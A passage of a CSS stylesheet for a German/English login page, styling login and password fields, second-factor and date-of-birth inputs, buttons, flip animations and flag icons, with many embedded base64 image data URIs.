Q2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVDMTEwLjYxNSwxOC45MzcsMTEwLjQxMywxOC43MzYsMTEwLjE2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMS44MDcsMjAuNTI0aDAuODk0YzAuMjQ3LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1YzAtMC4yNDYtMC4yLTAuNDQ3LTAuNDQ3LTAuNDQ3aC0wLjg5NA0KCQljLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVDMTExLjM1OSwyMC4zMjMsMTExLjU2MSwyMC41MjQsMTExLjgwNywyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwyMC41MjRoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMjAuMzIzLDExNC4wOTQsMjAuNTI0LDExNC4zNCwyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMTguNzM2aC0wLjg5NGMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTE4LjIxNCwxOC45MzcsMTE4LjAxMywxOC43MzYsMTE3Ljc2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxOC45MzcsMTIwLjU0NywxOC43MzYsMTIwLjMwMSwxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjItMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwxOC45MzcsMTIzLjA3OSwxOC43MzYsMTIyLjgzMywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMC4xNjcsMjEuMjdoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMjAxLTAuNDQ2LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yLDAuNDQ3LDAuNDQ2LDAuNDQ3aDAuODk0DQoJCWMwLjI0NiwwLDAuNDQ4LTAuMjAxLDAuNDQ4LTAuNDQ3di0wLjg5NUMxMTAuNjE1LDIxLjQ3MSwxMTAuNDEzLDIxLjI3LDExMC4xNjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMjEuMjdoLTUuOTZjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2g1Ljk2DQoJCWMwLjI0NiwwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NUMxMTguMjE0LDIxLjQ3MSwxMTguMDEzLDIxLjI3LDExNy43NjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMjEuMjdoLTAuODk1Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDYtMC4yMDEsMC40NDYtMC40NDd2LTAuODk1QzEyMC43NDcsMjEuNDcxLDEyMC41NDcsMjEuMjcsMTIwLjMwMSwyMS4yN3oiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTIyLjgzMywyMS4yN2gtMC44OTVjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwyMS40NzEsMTIzLjA3OSwyMS4yNywxMjIuODMzLDIxLjI3eiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjMuNTg1LDE0LjA3aC0xNS4wNjNjLTEuMjksMC0yLjMzOSwxLjA0OS0yLjMzOSwyLjM0djYuNDM5YzAsMS4yOSwxLjA0OSwyLjM0MSwyLjMzOSwyLjM0MWgxNS4wNjMNCgkJYzEuMjksMCwyLjMzOS0xLjA1MSwyLjMzOS0yLjM0MVYxNi40MUMxMjUuOTI0LDE1LjExOSwxMjQuODc1LDE0LjA3LDEyMy41ODUsMTQuMDd6IE0xMjQuNTUsMTYuNTR2Ni4xOA0KCQljMCwwLjc0MS0wLjYwNCwxLjM0My0xLjM0NCwxLjM0M2gtMTQuMzA1Yy0wLjc0MSwwLTEuMzQ0LTAuNjAyLTEuMzQ0LTEuMzQzdi02LjE4YzAtMC43NCwwLjYwMy0xLjM0MywxLjM0NC0xLjM0M2gxNC4zMDUNCgkJQzEyMy45NDYsMTUuMTk3LDEyNC41NSwxNS44LDEyNC41NSwxNi41NHoiLz4NCjwvZz4NCjwvc3ZnPg0K);
}
html.oldie .hasBgImage{
    background-image: url(data:image/png;base64,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);
}
span.icon{
    cursor:pointer;
    position:absolute;
    display:block;
    top:0;
    left:0;
    width:40px;
    height:40px;
    border:solid 1px #ccd7e1;
    border-top-left-radius:3px;
    border-bottom-left-radius:3px;
      } 
span.numbericon{
    background-position:8px 6px; 
    }
span.passwordicon{
    background-position:-24px 6px; 
    }
div.submit{
    margin:0 -14px;
    }
div.submit > input.submit{
    width:100%; 
    text-align:center;
    position:absolute;
    bottom:0;
    background:#0d5487;
    border:none;
    outline:none;
    color:#fff;
    border-bottom-left-radius:3px;
    border-bottom-right-radius:3px;
    padding:12px 0;
    cursor:pointer;
    font-family:'open_sansregular',Arial,sans-serif;
    font-weight:400;
    font-size:1.75rem;
    line-height:1.5rem;
}
div.submit > input.submitWithCancel{
 width:100%; 
 text-align:center;
 position:absolute;
 bottom:48px;
 background:#0d5487;
 border:none;
 outline:none;
 color:#fff;
 border-top-left-radius:0;
 border-top-right-radius:0;
 padding:12px 0;
 cursor:pointer;
 font-family:'open_sansregular',Arial,sans-serif;
 font-weight:400;
 font-size:1.75rem;
 line-height:1.5rem;
}
div.submit > input.cancel{
width:100%; 
 text-align:center;
 position:absolute;
 bottom:0;
 background:#c0c0c0;
 border:none;
 outline:none;
 color:#fff;
 border-bottom-left-radius:3px;
 border-bottom-right-radius:3px;
 padding:12px 0;
 cursor:pointer;
 font-family:'open_sansregular',Arial,sans-serif;
 font-weight:200;
 font-size:1.75rem;
 line-height:1.5rem;
}
 div.submit > input.submitFollowedByCancel{
    width:100%; 
    text-align:center;
    position:absolute;
    bottom:50px;
    background:#0d5487;
    border:none;
    outline:none;
    color:#fff;
    border-bottom-left-radius:3px;
    border-bottom-right-radius:3px;
    padding:12px 0;
    cursor:pointer;
    font-family:'open_sansregular',Arial,sans-serif;
    font-weight:400;
    font-size:1.75rem;
    line-height:1.5rem;
}

input.submit.disabled, input.submitWithCancel.disabled, input.submitFollowedByCancel.disabled, input.button.disabled{
	cursor:not-allowed !important;
}

.theform{
    overflow:hidden;
    }
input{
    padding:5px;
    font-family: 'open_sansregular', Arial, sans-serif;
    }
select{
    font-family: 'open_sansregular', Arial, sans-serif;
    }
.hidden{
    display:none !important;
    } 
input::-webkit-outer-spin-button,input::-webkit-inner-spin-button {
    -webkit-appearance: none; 
    margin: 0;
    }   
input::-o-outer-spin-button,
input::-o-inner-spin-button {
    -o-appearance: none;
    margin: 0;
}
input:focus{
    outline:none;
    } 
.infotext,.infotext a{
    display:none;
    font-size:.90rem;
    padding-bottom:12px;
    }    
.commontext{
    font-family: 'open_sansregular',Arial,sans-serif;
    padding-bottom:12px;
    }
.keyboard{
    float:right;
}        
.keyboard a{
    font-size:.875rem; 
    color:#ccd7e1;
    text-align:right;
    text-decoration:none;
    line-height:1.5rem;
    } 

a.helpkeyboard:after{
    content:" ";
    width: 16px;
    height: 16px;
    background-position: -89px -9px;
    display: inline-block;
    cursor:pointer;
}
.commonalert{
    display:none;
}
.iealert{
    color:orange;
    padding-bottom:12px;
}
.bottomlinks{
    clear:left;
    margin-left:50%;
    padding-top:12px;
}
.producticon{
    display:none;
}
.links{
    padding-top:12px;
    line-height:1.5rem;
    }
div.col2 .links{
    top:320px;
    position:relative;
}    
.language{
    width:100%;
    text-align:right;
    display:block;
    height:36px;
}

.language a{
    width:36px;
    height:24px;
    display:inline-block;
    background-repeat:no-repeat;
    background-position:center;
    border-radius:4px;
}
.language .lang_en{
    background-size:cover;
    margin:0 6px 0 0;
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAYCAYAAABwZEQ3AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA5hJREFUeNrslm1IU2EUx/+bd1lOTShzJYViL+QyDTTDCCU1IjRmJQYlakRkr5haEFTmlyIFMe3FwgwqqBYIKb0Xqw9GGjYrBYvawKyZvevEnNt6zpNburm2rn3oQwc2uM+959z/+d3znPNIPqdvDAi4fFoFIJL9ogr3a9DyvBvuLHJeIA6tnYreolL72vj0lVBbwnDuUqtb/4CJ3jixKQRC9VlYv/Xo2VK5wP5qenYXqyZkZ0AIn4OS4gQWrM2jgGItbmEwtinewausAlZ2LSjnwGdzlkqQxUSpTE1anqH3iiSWXSoyM8KZwzScrNF6RMlT85XLkJeqQNTjWzA3d0Ai9+Hvo/cSLGmBYTYMa9bxG9+v3QGjhMG2doSFBnBKuRuieJC/QeNUohkRV6ph1ndwGn5H9nMhvUYTTpzRQnil+4IdOmB9SiZWf3wER0ppKbM4pdLKJlGU3NBAQ2MnSiuauCDB5nS+XoeHobOxc40SU6/Xckqmpifw2ZqDoKFaqq1/yWuJHD2x5NgpyPbrgIxosGtWEvDZksMFUQwSQWJsJgx3/hNKv7OgKXLkLfXHzPv1sHR/5C8nESTGkcZwkySnXbaOFpBqZmesjFOyGvsgDZwEeeFWeIVM5/eftnYjXPLJaWt3Ri+B//V6yDT3+Zo7GiPEWJmJLUoqdEcxRFCsCf3qOtHOlu4PTuL61eJ3nIR1YCv+EZPiH7L/YlwWMO2AsRTwgKbhVzDW4mnYjkGM+K1Iu2eEGCZkTFt72Sq1yy5atCeONz8yGg/UBqgBUuPrzcpGoMTZr+u9EXL5OD6TqPsaS47xwUhNb3DFchx+NsHljPMKm5te5LhIbX/vrkVQMEE8YOlxDNxmHdVk4gHLzZF4oP2ApHl+Tp+pTifF0apmzGRJKEImwzs5/qeQtheQaJ9iadAAJirD0P5+EAMmy0gyjjQKt8dgvjJwVBra6GUoqzOwtt7JT3qujOgU7NPwpDIzlPBls00WswB9x2sw2NqOJLQjgSVVaQgefVDaHYfw2hwpq6/xiajsUqDlYscf1QBN+YbGt/YEfQ8U2BMUrt1APkswca0tQXaEcKRBD/arr9qx35yxGBfudbGHxZ343FGK0Ffj1BAl+6CkIqMHbMVGNCpe+7ssNjEHcndlQJ9JwxYSnGjcFU9DLCWpsawqjwnREw1z+iocNEejqu6Nx6c5MUa1lJt/mx/m6JzEaukLo5rzQ4ABAJwP7F5kZ2UKAAAAAElFTkSuQmCC);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMzVweCIgaGVpZ2h0PSIyMy41cHgiIHZpZXdCb3g9IjU3OC4xMzkgMjk3LjY2OSAzNSAyMy41IiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDU3OC4xMzkgMjk3LjY2OSAzNSAyMy41Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNGRkZGRkYiIGQ9Ik02MTMuMTM5LDMxOC4xMzZjMCwzLjAzMy0xLjQ0LDMuMDMzLTMuNzgxLDMuMDMzaC0yNy4zOTNjLTMuODI2LDAtMy44MjYtMS43MDYtMy44MjYtMi45MTZ2LTE3LjcxNQ0KCWMwLTEuNTIxLDAtMi44NjksNC4yOTUtMi44NjloMjYuNTczYzQuMTMyLDAsNC4xMzIsMS4wMzUsNC4xMzIsMi43MTNWMzE4LjEzNnoiLz4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik02MTIuNTA4LDMyMC40NjhjMC4zNTQtMC4zNzIsMC41OC0wLjg2NCwwLjYxNS0xLjQwOWwtOC41OTgtNS43MDFoLTIuNzQ2TDYxMi41MDgsMzIwLjQ2OHoiLz4NCjxwb2x5Z29uIGZpbGw9IiNFRjU1NjQiIHBvaW50cz0iNTk3LjQ4LDMwNi44NDMgNTk3LjQ4LDI5Ny42NjkgNTkzLjc5OSwyOTcuNjY5IDU5My43OTksMzA2Ljg0MyA1NzguMTM5LDMwNi44NDMgNTc4LjEzOSwzMTEuNzI5IA0KCTU5My43OTksMzExLjcyOSA1OTMuNzk5LDMyMS4xNjkgNTk3LjQ4LDMyMS4xNjkgNTk3LjQ4LDMxMS43MjkgNjEzLjEzOSwzMTEuNzI5IDYxMy4xMzksMzA2Ljg0MyAiLz4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik01ODkuNDk4LDMxMy4zNTdsLTEwLjcyNSw3LjEwOWMwLjQxMiwwLjQzMiwwLjk5LDAuNzAxLDEuNjMzLDAuNzAxaDAuMDU3bDExLjc4MS03LjgxM0w1ODkuNDk4LDMxMy4zNTcNCglMNTg5LjQ5OCwzMTMuMzU3eiIvPg0KPHBhdGggZmlsbD0iI0VGNTU2NCIgZD0iTTU4Ni43NTQsMzA1LjIxM2gyLjc0NGwtMTAuNTU1LTYuOTk2Yy0wLjM4OSwwLjMzMi0wLjY2OCwwLjc4OC0wLjc2NCwxLjMxM0w1ODYuNzU0LDMwNS4yMTN6Ii8+DQo8cGF0aCBmaWxsPSIjRUY1NTY0IiBkPSJNNjEwLjQxNCwyOTcuNjY5bC0xMS4zODEsNy41NDRoMi43NDZsMTAuNTU1LTYuOTk2Yy0wLjM5Ni0wLjMzNy0wLjktMC41NDgtMS40NjMtMC41NDhINjEwLjQxNHoiLz4NCjxwb2x5Z29uIGZpbGw9IiM0NTUxQUEiIHBvaW50cz0iNTc4LjEzOSwzMDAuNDEzIDU3OC4xMzksMzA1LjIxMyA1ODUuMzgxLDMwNS4yMTMgIi8+DQo8cG9seWdvbiBmaWxsPSIjNDU1MUFBIiBwb2ludHM9IjU5Mi41NjgsMzIxLjE2OSA1OTIuNTY4LDMxNC4wNTMgNTgxLjgzNCwzMjEuMTY5ICIvPg0KPHBvbHlnb24gZmlsbD0iIzQ1NTFBQSIgcG9pbnRzPSI1ODUuMzgxLDMxMy4zNTcgNTc4LjEzOSwzMTMuMzU3IDU3OC4xMzksMzE4LjE1NiAiLz4NCjxwb2x5Z29uIGZpbGw9IiM0NTUxQUEiIHBvaW50cz0iNTk4LjcwOSwyOTcuNjY5IDU5OC43MDksMzA0LjUxOCA2MDkuMDQxLDI5Ny42NjkgIi8+DQo8cG9seWdvbiBmaWxsPSIjNDU1MUFBIiBwb2ludHM9IjYwNS44OTgsMzA1LjIxMyA2MTMuMTM5LDMwNS4yMTMgNjEzLjEzOSwzMDAuNDEzICIvPg0KPHBvbHlnb24gZmlsbD0iIzQ1NTFBQSIgcG9pbnRzPSI2MTMuMTM5LDMxOC4xNTcgNjEzLjEzOSwzMTMuMzU3IDYwNS44OTgsMzEzLjM1NyAiLz4NCjxwb2x5Z29uIGZpbGw9IiM0NTUxQUEiIHBvaW50cz0iNTk4LjcwOSwzMTQuMDUzIDU5OC43MDksMzIxLjE2OSA2MDkuNDQzLDMyMS4xNjkgIi8+DQo8cG9seWdvbiBmaWxsPSIjNDU1MUFBIiBwb2ludHM9IjU5Mi41NjgsMjk3LjY2OSA1ODIuMjM2LDI5Ny42NjkgNTkyLjU2OCwzMDQuNTE4ICIvPg0KPC9zdmc+DQo=);
}

.language .lang_de{
    background-size:cover;
    margin:0 6px 0 0;  
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACUAAAAZCAYAAAC2JufVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAG9JREFUeNpifB+aIsDAwDAfiAMYBh58AOJCJiDRP0gcBALgAAI5SoFhkAEmhkEIRh016ihqA8b////vB9IOoyE16qhRR406apA6iuXH6s2D0VGbRqNv1FGjjhooR10YjI5qBOIFg8Q9oH5fIkCAAQBg9xHU4ifAIgAAAABJRU5ErkJggg==);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMzYuODM0cHgiIGhlaWdodD0iMjQuNzNweCIgdmlld0JveD0iNDI1LjI4OCAyODQuOTkzIDM2LjgzNCAyNC43MyIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyA0MjUuMjg4IDI4NC45OTMgMzYuODM0IDI0LjczIg0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik00NTkuNzM1LDI4NC45OTNoLTMyLjA1OGMtMS4zMTgsMC0yLjM4OSwxLjA2OC0yLjM4OSwyLjM4NnY1LjcwOWgzNi44M3YtNS43MDkNCglDNDYyLjEyLDI4Ni4wNjIsNDYxLjA1MywyODQuOTkzLDQ1OS43MzUsMjg0Ljk5M3oiLz4NCjxyZWN0IHg9IjQyNS4yOTIiIHk9IjI5My4wODkiIGZpbGw9IiNGRkZGRkYiIHdpZHRoPSIzNi44MjgiIGhlaWdodD0iOC4zOTUiLz4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik00MjUuMjkyLDMwMS40ODN2NS44NTNjMCwxLjMxOCwxLjA2NiwyLjM4OCwyLjM4NywyLjM4OGgzMi4wNThjMS4zMTcsMCwyLjM4Ni0xLjA2OCwyLjM4Ni0yLjM4OHYtNS44NTMNCglINDI1LjI5MnoiLz4NCjwvc3ZnPg0K);
}

body.de .language .lang_de,
body.en .language .lang_en{
    display:none;
    /*opacity:0.60;*/
    
    }
div.isSmallScreen{
        display:none;
        }
.flipicon {
    width: 30px;
    height: 27px;
    background-position: -58px 0;
    display: block;
    position: relative;
    top: 0px;
    right: 0px;
    cursor:pointer;
    float:right;
}
.center{
    width:80%;
    text-align:center;
    margin:5px auto 10px auto;
}
.center img{
    width:100%;
}
.text{
    padding:12px 0;
    line-height:1.125rem;
}

a.disabled {
    cursor: not-allowed;
    background-image: none;
    opacity: 0.65;
    filter: alpha(opacity=65);
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
    color: #333;
}

#selectAuthMethod {
	top: 0;
	left: 0;
	border: solid 1px #ccd7e1;
	border-radius: 3px;
	height: 40px;
	margin: 0;
	padding: 5px 9px;
	width: 270px;
	font-size: 16px;
	color: #555;
	-webkit-appearance: menulist;
}

div.secappSecondfactor {
	margin-top: 10px;
	margin-bottom: 6px;
}

p.secappSecondfactor {
	margin-bottom: 8px;
}

select.dateOfBirth {
	top: 0;
	left: 0;
	border: solid 1px #ccd7e1;
	border-radius: 3px;
	height: 40px;
	padding: 5px;
	font-size: 16px;
	color: #555;
	-webkit-appearance: menulist;
}

select.dateOfBirthDay {
	margin-right: 6px;
	width: 86px;
}

select.dateOfBirthMonth {
	margin-right: 6px;
	width: 86px;
}

select.dateOfBirthYear {
	width: 86px;
}

p.verificationCodeInput {
	margin-top: 10px;
	margin-bottom: 8px;
}

/************************************************************************
* SONDERKLASSEN do the flip
************************************************************************/
div.whitebox-info, div.whitebox{
    -ms-backface-visibility: hidden;
    -webkit-backface-visibility: hidden;
    -moz-backface-visibility: hidden;
    backface-visibility: hidden;
}
div.whitebox{
    -ms-transition: all 1s ease 0s;
    -webkit-transition: all 1s ease 0s;
    transition: all 1s ease 0s;
    -webkit-transform: rotateY(0deg);
    -ms-transform: rotateY(0deg);
    transform: rotateY(0deg);
    z-index: 2;
}
div.whitebox-info{
    -webkit-transform: rotateY(180deg);
    -ms-transform: rotateY(180deg);
    transform: rotateY(180deg);
    -ms-transition: all 1s ease 0s;
    -webkit-transition: all 1s ease 0s;
    transition: all 1s ease 0s;
}
.doflip div.whitebox {
    -webkit-transform: rotateY(180deg);
    -ms-transform: rotateY(180deg);
    transform: rotateY(180deg);
}

.doflip div.whitebox-info {
    -webkit-transform: rotateY(0deg);
    -ms-transform: rotateY(0deg);
    transform: rotateY(0deg);
}
/************************************************************************
* SONDERKLASSEN Produkt hat ein Icon
************************************************************************/
body.hasIcon .producticon{
    display:block;
    width:60px;
    height:60px;
    position:absolute;
    left:0;
}
body.hasIcon .product{
    padding-left:75px;
    position:relative;
}
/************************************************************************
* SONDERKLASSEN Email Login
************************************************************************/
body.email div.keyboard {
		display:none;
}
body.email span.numbericon{
    background:none;
}
body.email span.numbericon:before{
    content:"@";
     width:40px;
    height:40px;
    font-size:24px;
    color:#ccd7e1;
    text-align:center;
    padding-top:8px;
    display:block;
}
/************************************************************************
* SONDERKLASSEN  Login Error
************************************************************************/
body.loginerror .infotext{
    display:block;
    color:#cc0000;   
}
body.loginerror .infotext:before{
    content:" ";
    display:inline-block;
    top:0;
    left:0;
    width:17px;
    height:15px;
    background-repeat:no-repeat;
    background-color:#fff;
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKMAAAAbCAYAAAAQ9T+YAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABYhJREFUeNrsm71y4joUgL2Z9Ov7BOuUt3Nm6NeUVMATBJ4AUlMYitTAE+B9gnirlHb6zCy32jLkDbxPkHtOfJQIRbKPjcwuG58ZDeAfSZY+nT8Zx2mllVZaaWVfPnEvfPj5FMBHIB2KOv9+2R2jk9C2R217dCiDkkL723YKPxCMAIILH7cKiEJWAMR1gxBi20soI8MlKZTrxqDszbDdPhRfWgiviwHKdyixc3eTtSgdB8bEAKKQBcAwbwjEhEAoEgShaxXIHEJcBC7jamx/DUDOW5wahBGAQBB+lE0GgPBPAzCiNh5oNKFDgMqg7KAPFxYgxDo3mnY5gouh22rJ+nJWcp6jGdwGQPQUIHCCLwE41IBd+H5Bky/Eg3tGFkBMCkDMCDZcwJf0Wxb/5f68nlYagPF3iQrEUDbD8D0HY1/6B7Z5W+ISRABirpnvbrAvOl/ZJ6BbaQBGn1MJmXObsqddAL5UvYCATK1o6NxHDCz13Yf6Wv+xARivmPVcnfg4LBnXTAGyKcE7KLln0ppr+zB6zHq8kx2BXCu6bGh7s2cy6W6JZh+1eFWT85LzC4bWyFMbdmWnmOCiCFb3vYr0Gc8XQ3mC8pkg48CL1mLVIsYXTp7xtiTVgUnn0x303uyxQLNj0DLWRN2PLCDzyLsVizCiJtgUXHJhY1uQ0U4Vwa3KMRPG54KzQjvf7yW1e7OyjYDXsYH7di1mML+UZei8z4KwzTRGrRGAEh